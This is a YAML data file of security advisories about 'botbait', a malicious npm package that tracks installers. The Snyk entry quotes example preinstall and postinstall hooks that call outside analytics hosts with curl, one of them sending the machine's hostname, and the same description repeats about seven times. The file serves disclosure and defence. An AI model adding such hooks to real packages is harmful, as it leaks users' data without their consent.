---
- id: nodesecurity:npm:botbait:2017-09-26
  title: Tracking Module
  description: |-
    The module `botbait` is a tool to be used to track bot and automated tools usage with-in the npm ecosystem.

    `botbait` is known to record and track user information.

    The module tracks the following information.
    - Source IP
    - process.versions
    - process.platform
    - How the module was invoked (test, require, pre-install)
  affected_package: botbait
  vulnerable_versions:
  - "<=99.999.99999"
  patched_versions:
  - "<0.0.0"
  severity: medium
  package_manager: npm
  cvss_v3_vector: CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N
  credit:
  - Adam Baldwin
  references:
  - ''
  source_url: https://nodesecurity.io/advisories/483
- id: snykio:npm:botbait:2017-08-08
  title: Malicious Package
  description: |+
    `botbait` is a malicious package that was used to collect download
    metrics beyond what npm provides, and sent them to google analytics or
    piwik. This can cause a privacy concern amongst users.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    Example:

        {
          "name": "npm_scripts_test_metrics",
          "scripts": {
            "preinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'",
            "postinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'"
          }
        },
        {
          "name": "subtitles-lib",
          "scripts": {
            "postinstall": "bash -c 'curl \"http://*****.piwikpro.com/piwik.php?idsite=3&rec=1&action_name=$HOSTNAME\"'"
          }
        }

    The list of packages and their scripts are:

        npm_scripts_test_metrics
        subtitles-lib
        ikst
        botbait
        mktmpio
        anarchy

    \n`botbait` is a malicious package that was used to collect download
    metrics beyond what npm provides, and sent them to google analytics or
    piwik. This can cause a privacy concern amongst users.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    Example:

        {
          "name": "npm_scripts_test_metrics",
          "scripts": {
            "preinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'",
            "postinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'"
          }
        },
        {
          "name": "subtitles-lib",
          "scripts": {
            "postinstall": "bash -c 'curl \"http://*****.piwikpro.com/piwik.php?idsite=3&rec=1&action_name=$HOSTNAME\"'"
          }
        }

    The list of packages and their scripts are:

        npm_scripts_test_metrics
        subtitles-lib
        ikst
        botbait
        mktmpio
        anarchy

    \n`botbait` is a malicious package that was used to collect download
    metrics beyond what npm provides, and sent them to google analytics or
    piwik. This can cause a privacy concern amongst users.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    Example:

        {
          "name": "npm_scripts_test_metrics",
          "scripts": {
            "preinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'",
            "postinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'"
          }
        },
        {
          "name": "subtitles-lib",
          "scripts": {
            "postinstall": "bash -c 'curl \"http://*****.piwikpro.com/piwik.php?idsite=3&rec=1&action_name=$HOSTNAME\"'"
          }
        }

    The list of packages and their scripts are:

        npm_scripts_test_metrics
        subtitles-lib
        ikst
        botbait
        mktmpio
        anarchy

    \n`botbait` is a malicious package that was used to collect download
    metrics beyond what npm provides, and sent them to google analytics or
    piwik. This can cause a privacy concern amongst users.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    Example:

        {
          "name": "npm_scripts_test_metrics",
          "scripts": {
            "preinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'",
            "postinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'"
          }
        },
        {
          "name": "subtitles-lib",
          "scripts": {
            "postinstall": "bash -c 'curl \"http://*****.piwikpro.com/piwik.php?idsite=3&rec=1&action_name=$HOSTNAME\"'"
          }
        }

    The list of packages and their scripts are:

        npm_scripts_test_metrics
        subtitles-lib
        ikst
        botbait
        mktmpio
        anarchy

    \n`botbait` is a malicious package that was used to collect download
    metrics beyond what npm provides, and sent them to google analytics or
    piwik. This can cause a privacy concern amongst users.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    Example:

        {
          "name": "npm_scripts_test_metrics",
          "scripts": {
            "preinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'",
            "postinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'"
          }
        },
        {
          "name": "subtitles-lib",
          "scripts": {
            "postinstall": "bash -c 'curl \"http://*****.piwikpro.com/piwik.php?idsite=3&rec=1&action_name=$HOSTNAME\"'"
          }
        }

    The list of packages and their scripts are:

        npm_scripts_test_metrics
        subtitles-lib
        ikst
        botbait
        mktmpio
        anarchy

    \n`botbait` is a malicious package that was used to collect download
    metrics beyond what npm provides, and sent them to google analytics or
    piwik. This can cause a privacy concern amongst users.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    Example:

        {
          "name": "npm_scripts_test_metrics",
          "scripts": {
            "preinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'",
            "postinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'"
          }
        },
        {
          "name": "subtitles-lib",
          "scripts": {
            "postinstall": "bash -c 'curl \"http://*****.piwikpro.com/piwik.php?idsite=3&rec=1&action_name=$HOSTNAME\"'"
          }
        }

    The list of packages and their scripts are:

        npm_scripts_test_metrics
        subtitles-lib
        ikst
        botbait
        mktmpio
        anarchy

    \n`botbait` is a malicious package that was used to collect download
    metrics beyond what npm provides, and sent them to google analytics or
    piwik. This can cause a privacy concern amongst users.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    Example:

        {
          "name": "npm_scripts_test_metrics",
          "scripts": {
            "preinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'",
            "postinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=....'"
          }
        },
        {
          "name": "subtitles-lib",
          "scripts": {
            "postinstall": "bash -c 'curl \"http://*****.piwikpro.com/piwik.php?idsite=3&rec=1&action_name=$HOSTNAME\"'"
          }
        }

    The list of packages and their scripts are:

        npm_scripts_test_metrics
        subtitles-lib
        ikst
        botbait
        mktmpio
        anarchy

  affected_package: botbait
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cve:
  - CVE-2017-16126
  cwe:
  - CWE-506
  credit:
  - Jordan Wright
  references:
  - https://duo.com/blog/hunting-malicious-npm-packages/
  source_url: https://snyk.io/vuln/npm:botbait:20170917
